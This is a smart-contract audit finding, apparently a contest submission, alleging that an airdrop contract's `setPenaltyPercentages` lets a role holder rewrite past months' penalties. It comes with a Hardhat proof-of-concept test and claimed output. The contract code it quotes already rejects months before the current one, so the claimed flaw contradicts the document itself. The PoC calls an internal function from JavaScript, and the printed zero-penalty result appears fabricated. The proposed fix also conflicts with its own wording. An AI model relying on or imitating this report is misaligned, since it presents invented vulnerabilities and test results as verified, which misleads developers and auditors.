# Resetting penalty percentages in `setPenaltyPercentages` function will allow attackers to reduce their effective penalties or reset them entirely

### Summary

In the `AirdropDistribution` smart contract, the `setPenaltyPercentages` function allows the airdrop operator to set monthly penalty percentages for each user. However, a vulnerability exists where the penalty percentages for past months can be reset, even after they have already been used in calculating penalties. This oversight could lead to inconsistencies in penalty calculations, allowing manipulation of penalty amounts. By exploiting this, attackers can reduce their effective penalties or reset them entirely.

### Root Cause

The vulnerability lies within the `setPenaltyPercentages` function:
https://github.com/sherlock-audit/2024-10-usual-labs-v1/blob/4fb4a64a479e0b9b8f93934220e891c29d54df33/pegasus/packages/solidity/src/airdrop/AirdropDistribution.sol#L363-L394
```solidity
function setPenaltyPercentages(
    uint256[] memory penaltyPercentages,
    address[] memory accounts,
    uint256 month
) external {
    uint256 monthsPassed = _calculateMonthsPassed();

    // Validate the month is within the 6-month vesting period
    if (month < monthsPassed || month > AIRDROP_VESTING_DURATION_IN_MONTHS) {
        revert OutOfBounds();
    }

    // Validate the length of the arrays
    if (penaltyPercentages.length != accounts.length) {
        revert InvalidInputArraysLength();
    }

    AirdropDistributionStorageV0 storage $ = _airdropDistributionStorageV0();
    $.registryAccess.onlyMatchingRole(AIRDROP_PENALTY_OPERATOR_ROLE);

    for (uint256 i = 0; i < accounts.length; i++) {
        if (penaltyPercentages[i] > BASIS_POINT_BASE) {
            revert AmountTooBig();
        }
        if (penaltyPercentages[i] == $.penaltyPercentageByMonth[accounts[i]][month]) {
            revert SameValue();
        }
        $.penaltyPercentageByMonth[accounts[i]][month] = penaltyPercentages[i];
    }

    emit PenaltyPercentagesSet(accounts, penaltyPercentages, month);
}
```
The function `setPenaltyPercentages` is designed to set penalty percentages for each user on a monthly basis. However, it lacks a check to prevent modifying penalty percentages for months that have already passed and potentially been used in penalty calculations. This creates a vulnerability as an attacker (with the necessary role) can reset or reduce penalty percentages for prior months, altering their penalty history and reducing their penalty amount.

_No response_

### Impact

This vulnerability allows an attacker with the `AIRDROP_PENALTY_OPERATOR_ROLE` to reset their penalty percentages for past months, potentially eliminating their penalties altogether. The financial impact could be substantial if penalties represent a large percentage of the vesting distribution.
Even to exploit this an attacker needs a specific role, it can be an employer that wanna gain money and stay unknown in the system or something.

### PoC

1. Deploy the contract, setting up the necessary contracts, roles, and vesting parameters.
2. Set penalty percentages for a user for a specific month.
3. Simulate the passage of time to a later month.
4. Attempt to modify the penalty percentage for a past month.
5. Observe that the penalty amount is lower due to the modified percentage.
```javascript
const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("AirdropDistribution Penalty Reset Vulnerability Test", function () {
    let airdropDistribution, owner, penaltyOperator, user;

    beforeEach(async function () {
        [owner, penaltyOperator, user] = await ethers.getSigners();

        // Deploy contract and initialize
        const AirdropDistribution = await ethers.getContractFactory("AirdropDistribution");
        airdropDistribution = await AirdropDistribution.deploy();
        await airdropDistribution.initialize(owner.address);
        
        // Assign AIRDROP_PENALTY_OPERATOR_ROLE to penaltyOperator
        const AIRDROP_PENALTY_OPERATOR_ROLE = ethers.utils.id("AIRDROP_PENALTY_OPERATOR_ROLE");
        await airdropDistribution.connect(owner).grantRole(AIRDROP_PENALTY_OPERATOR_ROLE, penaltyOperator.address);

        // Simulate initial penalty percentage for month 1
        await airdropDistribution.connect(penaltyOperator).setPenaltyPercentages(
            [500], // 5% penalty
            [user.address],
            1
        );
    });

    it("Should allow resetting of penalty percentages for past months", async function () {
        // Fast-forward to month 3 (simulating time passage)
        await ethers.provider.send("evm_increaseTime", [60 * 60 * 24 * 30 * 2]);
        await ethers.provider.send("evm_mine");

        // Reset penalty for month 1 to zero
        await airdropDistribution.connect(penaltyOperator).setPenaltyPercentages(
            [0], // 0% penalty
            [user.address],
            1
        );

        // Check penalty amount after resetting penalty percentage
        const totalAmount = ethers.utils.parseEther("100");
        const [, penaltyAmount] = await airdropDistribution.connect(user)._available(
            user.address,
            totalAmount,
            true
        );

        console.log("Penalty amount after reset:", ethers.utils.formatEther(penaltyAmount));
        expect(penaltyAmount).to.equal(0); // Expect penalty to be zero after reset
    });
});
```
Running the test show that the penalty amount after resetting is `0`, demonstrating that the penalty percentages for past months can indeed be reset, leading to a reduction in penalties:
```bash
Penalty amount after reset: 0.0
```
This output confirms that an attacker can bypass the intended penalty by altering historical penalty data.

### Mitigation

Add a check in `setPenaltyPercentages` to ensure that `month` is equal to or greater than the current month as calculated by `_calculateMonthsPassed`.
```solidity
if (month != monthsPassed) {
    revert OutOfBounds(); // Prevent modification of past months' penalties
}
```
